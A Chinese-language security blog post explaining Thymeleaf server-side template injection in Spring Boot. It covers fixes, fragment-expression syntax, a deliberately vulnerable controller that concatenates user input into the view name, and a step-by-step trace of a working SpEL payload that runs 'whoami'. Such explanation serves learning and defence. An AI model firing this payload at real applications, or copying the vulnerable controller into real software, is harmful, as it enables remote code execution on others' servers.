---
title: "Java SSTI · Thymeleaf"
date: 2026-04-12 00:00:00 +0800
categories:
  - ssti
  - web
  - security
tags:
  - java
  - thymeleaf
---

模板引擎的作用：数据展示与视图渲染，抽取公共页面，减少代码量。

漏洞成因：将逻辑和渲染混淆，服务器对数据进行渲染导致 RCE。

## 修复方案

1.使用 `redirect:` 或 `forward:` 修饰，调用 RedirectView 而不是 ThymeleafView 去解析

```java
@GetMapping("/safe/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url;
}   
```

2.使用 `@ResponseBody` 或 `@RestController` 修饰，不通过视图解析器进行渲染

```java
@GetMapping("/safe/fragment")
@ResponseBody
public String safeFragment(@RequestParam String section) {
   return "welcome:: " + section; 
}
```

3.设置参数为 HttpServletResponse，不解析视图

```java
@GetMapping("/safe/doc/{document}")
public void getDocument(@PathVariable String document,HttpServletResponse response){
   log.info("Retrieving " + document);
}
```

4.白名单校验：如果业务确实需要动态视图，严禁黑名单，必须对传入的视图名参数（如 `language`）进行严格的白名单匹配，禁止直接拼接用户输入。

## 防御建议

1. **输入验证**：对用于拼接模板路径/视图名的参数进行白名单校验。
2. **最小权限**：以低权限用户运行 Web 服务，限制 RCE 后的影响面。
3. **分离逻辑和渲染**：避免在控制器中通过字符串拼接来动态决定视图名。
4. **限制模板访问**：配置模板引擎的访问前缀与后缀，防止路径穿越。
5. **更新模板依赖**：Spring Boot 与 Thymeleaf 在较新版本中对该解析逻辑做过部分安全加固，保持依赖更新

## 语法介绍：

`${...}`：变量表达式 —— 通常在实际应用中一般是 OGNL 表达式或者是 Spring EL，如果集成了 Spring 的话，可以在上下文变量（context variables）中执行

`*{...}`：选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。

`#{...}`：国际化（Message / i18n）表达式 —— 允许从外部源（比如 `.properties` 文件）检索特定于语言环境的消息

`@{...}`：链接（URL）表达式 —— 一般用在应用程序中设置正确的 URL/路径（URL 重写）。

`~{...}`：片段表达式 —— Thymeleaf 3.x 版本新增的内容，片段表达式是一种表示标记片段并将其移动到模板周围的简单方法。

### `~{templatename :: selector}`  引用其他模板的片段

示例代码：file.html,里面用 `th:fragment="food"` 定义了一个信息片段。

```html
<!DOCTYPE html> 
<html xmlns:th="http://www.thymeleaf.org"> 
<body> <div th:fragment="food"> &copy; apple</div> 
</body> 
</html>
```

然后在另一template中可以通过片段表达式引用该片段：

```html
<div th:insert="~{file :: food}"></div>
```

- **最终效果**：Thymeleaf 会把 `file.html` 中那个 `<div>` 标签里的内容（`apple`）**完整地插入**到 `index.html` 的对应位置,成功套用了模板。
  ### `~{templatename}`  引用整个模板文件
- **语法结构**：`~{外部模板文件名}`
- **执行过程**：当你不指定 `:: selector` 部分时，引擎会认为你**不需要挑选片段，而是要引入整个文件**。
- **用途**：常见于页面布局，比如 `<div th:replace="~{layout :: #main-content}">`，但如果没有 `::`，就直接把 `layout.html` 的全部内容搬过来。这在你想复用整个公共头部、侧边栏时很有用。

### `~{::selector}` 或 `~{this::selector}`  引用当前模板的片段

`~{::选择器}`。`this::` 是显式写法，省略模板名默认为当前模板。**当** **`::`** **前面没有模板名（或者写** **`this`）时，引擎会在当前正在解析的同一个模板文件内寻找片段**。

- **选择器的多样性**：这里的 `selector` **不仅可以是** **`th:fragment`** **定义的名称**，还可以是**标准的 CSS 选择器**（如 ID 选择器 `#header`、类选择器 `.content`）。

引擎就必须在冒号后面找到一个合法的 `selector`。哪怕这个选择器实际上找不到任何内容（比如一个不存在的类名 `.x`），也必须写一个，从而满足语法规则，但没有实际用途。

## 漏洞

我们从poc解析的流程一步步讲解.

入口controller：

```java
@GetMapping("/admin") 
public String path(@RequestParam String language) 
{ 
    return "language/" + language + "/admin"; 
}
```

拼接文件路径字符串，例如 `language/cn/admin`.

这里的返回值在 Spring MVC + Thymeleaf 架构中叫做**视图名**。Thymeleaf 拿到这个视图名后，并不是直接去读文件，而是先用**表达式解析器**分析一下里面有没有特殊语法。

此处如果用了thymeleaf的解析器，就会产生漏洞。

在 Spring Boot + Thymeleaf 中，如果视图名可控，就会导致漏洞的产生。其主要原因就是在控制器中执行 return 后，Spring 会自动调度 Thymeleaf 引擎寻找并渲染模板，在寻找的过程中，会将传入的参数当成 **SpEL 表达式** 执行，从而导致了远程代码执行漏洞。

Thymeleaf 渲染的流程如下：

- createView() 根据视图名创建对应的View

![thymeleaf_1](/photo/ssti/javassti/thymeleaf_1.png)

- renderFragment() 根据视图名解析模板名称

  在 renderFragment 方法的逻辑中，当视图名不包含 :: 时：
  ```java
  if (!viewTemplateName.contains("::")) {
      templateName = viewTemplateName;  // 直接赋值
      markupSelectors = null;
  }
  ```
  视图名等于模板名，templateName = viewTemplateName = "language/en/admin"

  如果**有** `::`，Thymeleaf 就认为“用户想引用某个模板片段”，于是把它当成**片段表达式**，然后再进行预处理，最终执行了表达式。

  **步骤1：用户输入**
  ```text
  http://localhost:8080/path?language=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::.x
  ```

后端控制器接收到的参数值：

```text
language = "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__::.x"
```

**步骤 2：控制器中拼接视图名**

控制器中的拼接操作：

```java
return "language/" + language + "/admin";
```

拼接后的完整视图名：

```text
viewName = "language/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__::.x/admin"
```

\*\*步骤 3：renderFragment() 检测到 "::"\*\*并拼接

```java
    // 进入此分支                                                          fragmentExpression = parser.parseExpression(                            context,                                                            "~{" + viewTemplateName + "}"           
```

```text
 "~{language/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__::.x/admin}"  
```

**预处理器扫描整个表达式**，识别 \_\_xxx \_\_ 包裹的内容

```text
${new java.util.Scanner(T(java.lang.Runtime).getRuntime() .exec(\"whoami\").getInputStream()).next()}
```

**步骤4：VariableExpression 执行 SpEL** **表达式**

```text
 ${new java.util.Scanner(T(java.lang.Runtime).getRuntime() .exec("whoami").getInputStream()).next()}                 
```

1. T(java.lang.Runtime) → 获取 Runtime 类的 Class 对象
2. .getRuntime() → 调用静态方法，获取 Runtime 实例
3. .exec("whoami") → 执行系统命令 "whoami"
4. .getInputStream() → 获取命令执行的输出流
5. new java.util.Scanner(...) → 创建 Scanner 对象读取输出
6. .next() → 读取命令执行结果的第一行

```
例如：返回 `desktop-abc123\\admin`  
```

由于 SpEL 执行发生在模板渲染之前，是否渲染成功已经不重要了，所以可以用任意的 selector（例如 `.x`）。
